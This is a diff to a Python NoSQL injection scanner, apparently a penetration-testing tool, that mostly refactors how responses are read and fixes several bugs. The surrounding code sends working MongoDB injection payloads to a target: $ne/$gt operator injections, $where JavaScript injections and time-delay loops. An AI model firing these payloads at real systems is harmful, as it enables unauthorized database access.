@@ -164,10 +164,11 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
 
         # Test for errors returned by injection
         req = urllib.request.Request(uriArray[1], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum += 1
         else:
@@ -182,11 +183,11 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
 
         print(uriArray[2])
         req = urllib.request.Request(uriArray[2], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
-
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum += 1
 
@@ -201,11 +202,11 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
             print("Test 3:  $where injection (integer escape)")
 
         req = urllib.request.Request(uriArray[3], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
-
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum +=1
 
@@ -221,10 +222,11 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
             print("Test 4: $where injection string escape (single record)")
 
         req = urllib.request.Request(uriArray[4], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum += 1
         else:
@@ -238,10 +240,11 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
             print("Test 5: $where injection integer escape (single record)")
 
         req = urllib.request.Request(uriArray[5], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum +=1
 
@@ -256,10 +259,11 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
             print("Test 6: This != injection (string escape)")
 
         req = urllib.request.Request(uriArray[6], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum += 1
         else:
@@ -273,10 +277,11 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
             print("Test 7: This != injection (integer escape)")
 
         req = urllib.request.Request(uriArray[7], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum += 1
         else:
@@ -291,10 +296,11 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
             print("Test 8: PHP/ExpressJS > Undefined Injection")
 
         req = urllib.request.Request(uriArray[8], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum += 1
 
@@ -341,7 +347,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
         if lt24 == True:
             bfInfo = input("MongoDB < 2.4 detected.  Start brute forcing database info (y/n)? ")
 
-            if bfInfo.lower == "y":
+            if bfInfo.lower() == "y":
                 getDBInfo()
 
 
@@ -508,9 +514,8 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             print("Random value variance: " + str(randNormDelta) + "\n")
 
         # Generate not equals injection
-        neDict = postData
-        neDict[injOpt + "[$ne]"] = neDict[injOpt]
-        del neDict[injOpt]
+        neDict = postData.copy()
+        neDict[injOpt + "[$ne]"] = neDict.pop(injOpt)
         body = urllib.parse.urlencode(neDict)
         req = urllib.request.Request(appURL,body.encode(), requestHeaders)
         if verb == "ON":
@@ -519,10 +524,11 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         else:
             print("Test 1: PHP/ExpressJS != associative array injection")
 
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
 
@@ -530,13 +536,9 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             testNum +=1
         print("\n")
 
-        # Delete the extra key
-        del postData[injOpt + "[$ne]"]
-
         # generate $gt injection
-        gtDict = postData
-        gtDict.update({injOpt:""})
-        gtDict[injOpt + "[$gt]"] = gtDict[injOpt]
+        gtDict = postData.copy()
+        gtDict[injOpt + "[$gt]"] = ""
         del gtDict[injOpt]
         body = urllib.parse.urlencode(gtDict)
         req = urllib.request.Request(appURL,body.encode(), requestHeaders)
@@ -546,11 +548,14 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         else:
             print("Test 2:  PHP/ExpressJS > Undefined Injection")
 
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,postData)
+            testNum += 1
+        else:
             testNum += 1
 
         postData.update({injOpt:"a'; return db.a.find(); var dummy='!"})
@@ -563,10 +568,11 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         else:
             print("Test 3: $where injection (string escape)")
 
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
         else:
@@ -583,10 +589,11 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         else:
             print("Test 4: $where injection (integer escape)")
 
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
         else:
@@ -604,10 +611,11 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         else:
             print("Test 5: $where injection string escape (single record)")
 
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
 
@@ -625,10 +633,11 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         else:
             print("Test 6: $where injection integer escape (single record)")
 
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
 
@@ -647,10 +656,11 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         else:
             print("Test 7: This != injection (string escape)")
 
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
             print("\n")
@@ -667,10 +677,11 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         else:
             print("Test 8:  This != injection (integer escape)")
 
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+        respBody = getResponseBodyHandlingErrors(req)
+        errorCheck = errorTest(respBody,testNum)
 
         if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            injLen = int(len(respBody))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
 
@@ -686,15 +697,13 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             print("Starting Javascript string escape time based injection...")
             postData.update({injOpt:"a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(curDate.getTime()-date.getTime()))/1000 < 10); return true; var dummy='a"})
             body = urllib.parse.urlencode(postData)
-            conn = urllib.request.urlopen(req,body.encode())
+            req = urllib.request.Request(appURL,body.encode(), requestHeaders)
             start = time.time()
+            conn = urllib.request.urlopen(req)
             page = conn.read()
             end = time.time()
             conn.close()
-            print(str(end))
-            print(str(start))
             strTimeDelta = (int(round((end - start), 3)) - timeBase)
-            #print(str(strTimeDelta))
             if strTimeDelta > 25:
                 print("HTTP load time variance was " + str(strTimeDelta) +"  seconds! Injection possible.")
                 strTbAttack = True
@@ -707,15 +716,13 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
 
             postData.update({injOpt:"1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"})
             body = urllib.parse.urlencode(postData)
+            req = urllib.request.Request(appURL,body.encode(), requestHeaders)
             start = time.time()
-            conn = urllib.request.urlopen(req,body.encode())
+            conn = urllib.request.urlopen(req)
             page = conn.read()
             end = time.time()
             conn.close()
-            print(str(end))
-            print(str(start))
             intTimeDelta = ((end-start) - timeBase)
-            #print(str(strTimeDelta))
             if intTimeDelta > 25:
                 print("HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible.")
                 intTbAttack = True
